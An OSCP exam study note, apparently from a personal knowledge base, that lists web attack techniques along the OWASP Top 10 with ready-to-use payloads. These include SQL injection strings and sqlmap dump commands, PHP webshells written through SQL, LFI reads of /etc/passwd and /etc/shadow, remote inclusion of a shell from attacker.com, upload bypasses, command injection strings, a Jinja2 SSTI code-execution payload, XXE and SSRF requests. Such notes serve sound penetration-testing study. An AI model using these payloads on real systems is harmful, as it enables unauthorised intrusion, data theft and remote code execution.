---
tags: [oscp, web, vulnerabilities, owasp]
aliases: [OWASP Top 10, Web Hacking]
category: Web
difficulty: ★★★☆☆
last-updated: 2025-04-30
---

# 🌐 Web Vulnerabilities (OWASP Top 10 + OSCP)

> [!info] Web Apps in OSCP
> ~15% of exam weight. Focus on **RCE paths**: SQLi → RCE, LFI → RCE, Upload → RCE.

---

## 📊 OWASP Top 10 (2021)

| Rank | Vulnerability | OSCP Risk | Impact |
|------|---|---|---|
| 1 | **Broken Access Control** | Medium | Data disclosure |
| 2 | **Cryptographic Failures** | Low | Data exposure |
| 3 | **Injection** (SQL, OS, LDAP) | **CRITICAL** | RCE |
| 4 | **Insecure Design** | Medium | Logic bypass |
| 5 | **Security Misconfiguration** | High | Full compromise |
| 6 | **Vulnerable & Outdated Components** | High | Known exploits |
| 7 | **Authentication Failures** | High | Bypass |
| 8 | **Software & Data Integrity** | Medium | Code injection |
| 9 | **Security Logging & Monitoring** | Low | Persistence |
| 10 | **SSRF** | **CRITICAL** | Internal access |

---

## 💉 1. SQL Injection (SQLi)

**What:** Unsanitized database queries → execute arbitrary SQL

### Detection

```
Normal: http://target/search?id=1
SQLi: http://target/search?id=1' OR '1'='1
```

### Manual Exploitation

```sql
' UNION SELECT username, password FROM users-- -
' UNION SELECT NULL, @@version-- -
' UNION SELECT table_name FROM information_schema.tables-- -
```

### SQLMap (Automated)

```bash
# Simple
sqlmap -u "http://target/page?id=1" --dbs --batch

# POST data
sqlmap -u "http://target/login" --data="user=admin&pass=test" -p user --dbs

# Get data
sqlmap -u "http://target/page?id=1" -D database_name -T users --dump

# RCE (if DBMS allows)
sqlmap -u "http://target/page?id=1" --os-cmd whoami
```

### SQLi to RCE

```sql
-- MySQL (into outfile)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'

-- MSSQL (xp_cmdshell)
EXEC xp_cmdshell 'whoami';

-- PostgreSQL (COPY TO)
COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';
```

---

## 🔗 2. Local File Inclusion (LFI)

**What:** Read arbitrary files via path traversal

### Detection & Exploitation

```
Normal: http://target/page?file=about.php
LFI: http://target/page?file=../../../../etc/passwd
```

### Payloads

```bash
# Linux files
?file=../../../../etc/passwd
?file=../../../../etc/shadow          # Usually not readable
?file=../../../../etc/hosts
?file=../../../../proc/self/environ

# PHP-specific
?file=php://filter/convert.base64-encode/resource=index.php

# Log files
?file=../../../../var/log/apache2/access.log
?file=../../../../var/log/auth.log
```

### LFI to RCE

```
1. Write via upload: POST file → stored in /uploads/
2. Include in LFI: ?file=../uploads/shell.php
3. Execute: browser calls it → RCE
```

---

## 📤 3. Remote File Inclusion (RFI)

**What:** Include remote files → instant RCE

### Detection

```
?file=http://attacker.com/shell.php    # RFI
?file=php://filter/resource=http://attacker.com/shell.php
```

### Exploitation

```php
<?php system($_GET['cmd']); ?>
```

```
http://target/page?file=http://attacker.com/shell.php&cmd=id
```

---

## 📤 4. File Upload Bypass

**What:** Upload malicious files (shells) without restriction

### Common Bypasses

```bash
# MIME type bypass
curl -F "file=@shell.php.jpg" http://target/upload

# Double extension
shell.php.jpg
shell.php.png

# Null byte
shell.php%00.jpg  # PHP < 5.3.4

# Content-Type manipulation
# Set: image/jpeg but upload .php file

# Magic bytes
# Add PNG header: ‰PNG... before PHP code

# htaccess upload (if allowed)
AddType application/x-httpd-php .jpg
# Then upload shell.jpg
```

---

## 🔐 5. Authentication Bypass

### SQL Injection in Login

```
Username: admin' --
Password: anything

Query becomes: SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
# Comment removes password check!
```

### Default Credentials

```
admin / admin
admin / password
root / root
admin / 12345
```

### Password Reset Bypass

```
Modify: email=attacker@email.com
Or: user_id=2 (change to admin)
```

---

## ⚙️ 6. Command Injection

**What:** Unsanitized system commands → RCE

### Detection

```
Normal: http://target/ping?ip=8.8.8.8
Injection: http://target/ping?ip=8.8.8.8; whoami
```

### Payloads

```bash
; id ;
| whoami |
& whoami &
` id `
$( id )
|| id ||
&& whoami &&
```

---

## 🔓 7. Insecure Deserialization

**What:** Unserialize untrusted data → arbitrary code execution

### PHP Serialization RCE

```php
O:4:"Evil":1:{s:4:"prop";s:3:"cat /etc/passwd";}

# Can trigger __wakeup() or __destruct() magic methods
```

---

## 🚫 8. Cross-Site Request Forgery (CSRF)

**What:** Force victim to perform actions

### Exploitation (change password)

```html
<img src="http://target/admin/change_password?new_pass=hacked" />
```

### No impact for RCE, but useful for account takeover

---

## 🔄 9. Server-Side Template Injection (SSTI)

**What:** Inject code into template engine

### Detection

```
{{ 7 * 7 }}  # If renders as "49", SSTI exists
```

### Exploitation (Jinja2)

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

---

## 🌐 10. SSRF (Server-Side Request Forgery)

**What:** Server makes request to attacker-controlled URL

### Impact

```
1. Access internal services (localhost:8080)
2. Port scanning (localhost:1-65535)
3. Cloud metadata (AWS, GCP, Azure)
```

### Exploitation

```
http://target/fetch?url=http://127.0.0.1:8080
http://target/fetch?url=file:///etc/passwd
```

---

## 🔐 11. XXE Injection (XML External Entity)

**What:** Malicious XML entities → file read / SSRF

### Exploitation

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

---

## 🔗 12. Path Traversal

**What:** Access files outside intended directory

### Exploitation

```
/admin      → /admin/index.php
/admin/..   → /
/admin/../../etc/passwd
```

---

## 📋 Web Exploitation Checklist

- [ ] Identify technology (whatweb, wappalyzer)
- [ ] Test for SQLi (simple quote + OR)
- [ ] Brute-force directories (gobuster)
- [ ] Test for LFI (../../../../etc/passwd)
- [ ] Try file upload → RCE
- [ ] Test authentication bypass
- [ ] Look for default credentials
- [ ] Check for CSRF tokens
- [ ] Test command injection
- [ ] Manual source code review
- [ ] Look for API endpoints
- [ ] Check for API key leaks
- [ ] Test SSRF possibilities

---

## 💡 Pro Tips

> [!tip] RCE is the Goal
> SQLi + file write = RCE. LFI + log poisoning = RCE. Always chain to code execution.

> [!tip] Burp Suite
> Intercept requests, modify parameters, test payloads systematically.

---

**Related Notes:**
- [[04-Web/SQL-Injection|💉 SQL Injection]]
- [[04-Web/LFI-RFI-to-RCE|🔗 LFI/RFI to RCE]]
- [[04-Web/Command-Injection|⚙️ Command Injection]]

---
